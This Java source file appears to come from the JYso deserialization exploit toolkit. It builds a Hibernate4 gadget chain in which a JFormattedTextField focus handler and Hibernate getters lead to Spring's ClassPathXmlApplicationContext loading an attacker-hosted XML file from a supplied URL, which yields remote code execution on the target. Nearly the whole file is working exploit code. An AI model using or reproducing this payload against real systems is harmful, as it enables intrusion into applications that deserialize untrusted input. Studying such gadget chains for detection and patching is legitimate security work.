package com.qi4l.JYso.gadgets;

import com.alibaba.fastjson.JSONArray;
import com.qi4l.JYso.gadgets.annotation.Authors;
import com.qi4l.JYso.gadgets.annotation.Dependencies;
import com.qi4l.JYso.gadgets.utils.Reflections;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;

import javax.management.BadAttributeValueExpException;
import javax.swing.*;
import javax.swing.text.DefaultFormatter;
import javax.swing.text.PlainDocument;
import javax.swing.text.StringContent;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

import static com.qi4l.JYso.gadgets.utils.InjShell.insertField;
/**
 * <p>
 *  newInstance()
 * javax.swing.text.DefaultFormatter#stringToValue()
 * javax.swing.JFormattedTextField#commitEdit()
 * javax.swing.JFormattedTextField$FocusLostHandler.run()
 * org.hibernate.property.access.spi.GetterMethodImpl.get()
 * org.hibernate.tuple.component.AbstractComponentTuplizer.getPropertyValue()
 * org.hibernate.type.ComponentType.getPropertyValue(C)
 * org.hibernate.type.ComponentType.getHashCode()
 * org.hibernate.engine.spi.TypedValue$1.initialize()
 * org.hibernate.engine.spi.TypedValue$1.initialize()
 * org.hibernate.internal.util.ValueHolder.getValue()
 * org.hibernate.engine.spi.TypedValue.hashCode()
 * <p>
 **/
@Dependencies({" org.hibernate.hibernate-core:hibernate-core >= 5.x", " springboot:springboot"})

//https://github.com/Mechoy/JavaExploit/blob/main/src/main/java/com/mechoy/gadget/Hibernate_ClassPathXmlApplicationContextExec.java   简化
public class Hibernate4 implements ObjectPayload<Object>, DynamicDependencies {
    @Override
    public Object getObject(String command) throws Exception {

        if (!command.toLowerCase().startsWith("http://") && !command.toLowerCase().startsWith("https://")) {
            throw new Exception("Command format is: http://[ip]:[port]/[exp].xml");
        }

        DefaultFormatter defaultFormatter = new DefaultFormatter();
        defaultFormatter.setValueClass(Class.forName("org.springframework.context.support.ClassPathXmlApplicationContext"));

        JFormattedTextField jFormattedTextField = new JFormattedTextField();
        Reflections.setFieldValue(jFormattedTextField, "format", defaultFormatter);

        //设置document，写入payload，反序列化时通过getText取出
        StringContent stringContent = new StringContent(command.trim().length());
        stringContent.insertString(0, command.trim());
        PlainDocument plainDocument = new PlainDocument(stringContent);
        jFormattedTextField.setDocument(plainDocument);

        //构造JFormattedTextField$FocusLostHandler对象
        Class<?> focusLostHandlerClass = Class.forName("javax.swing.JFormattedTextField$FocusLostHandler");
        Constructor<?> focusLostHandlerConstructor = focusLostHandlerClass.getDeclaredConstructor(JFormattedTextField.class);
        focusLostHandlerConstructor.setAccessible(true);
        Object focusLostHandler = focusLostHandlerConstructor.newInstance(jFormattedTextField);
        Reflections.setFieldValue(jFormattedTextField, "focusLostBehavior", 0);
        Method run = focusLostHandler.getClass().getDeclaredMethod("run");
        run.setAccessible(true);

        return Hibernate1.makeCaller(focusLostHandler, Hibernate1.makeHibernate5Getter(focusLostHandler.getClass(), "run"));
    }
}
